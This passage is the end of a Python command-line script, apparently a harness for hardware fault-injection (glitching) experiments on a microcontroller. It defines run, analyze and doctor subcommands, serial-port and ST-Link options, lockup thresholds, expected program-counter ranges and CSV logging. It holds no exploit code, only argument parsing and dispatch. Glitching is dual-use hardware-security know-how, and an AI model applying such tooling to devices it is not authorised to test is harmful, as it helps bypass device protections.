    run.add_argument("--max-lockups", type=int, default=5, help="Abort threshold")
    run.add_argument("--out", default=None, help="CSV output path (overrides --out-dir/--tag)")
    run.add_argument("--out-dir", default=None, help="Output directory for auto-named CSVs")
    run.add_argument("--tag", default=None, help="Tag appended to auto-named CSVs")
    run.add_argument("--no-plot", action="store_true", help="Disable live plotting (headless)")
    run.add_argument("--quiet", action="store_true", help="Suppress per-step output (still logs)")
    run.add_argument("--print-every", type=int, default=1, help="Print every N steps (ignored with --quiet)")

    ana = sub.add_parser("analyze", help="Analyze an existing CSV file")
    ana.add_argument("csv", help="Path to CSV log")

    doc = sub.add_parser("doctor", help="Check environment, ports, and toolchain")
    doc.add_argument("--port", default="auto", help="Glitcher serial port (or 'auto')")

    return p


def main_cli() -> int:
    global EXPECTED_PC_MIN, EXPECTED_PC_MAX

    parser = build_parser()
    args = parser.parse_args()

    if getattr(args, "list_ports", False):
        print(_list_ports_text())
        return 0

    if not args.cmd:
        parser.print_help()
        return 2

    if args.cmd == "doctor":
        return doctor_cmd(args.port)

    if args.cmd == "analyze":
        analyze_csv_file(args.csv)
        return 0

    if args.cmd == "run":
        EXPECTED_PC_MIN = args.pc_min
        EXPECTED_PC_MAX = args.pc_max

        port = resolve_port(args.port)
        log_path = make_output_path(args.out, args.out_dir, args.tag)

        exp = GlitchExperiment(
            port,
            stlink_auto=not args.no_debug,
            log_path=log_path,
            enable_plot=not args.no_plot,
            quiet=args.quiet,
            print_every=args.print_every,
        )
        exp.max_lockups = args.max_lockups
        exp.run(steps=args.steps)
        return 0

    parser.print_help()
    return 2


# =============================================================================
# Entry Point
# =============================================================================

if __name__ == "__main__":
    raise SystemExit(main_cli())
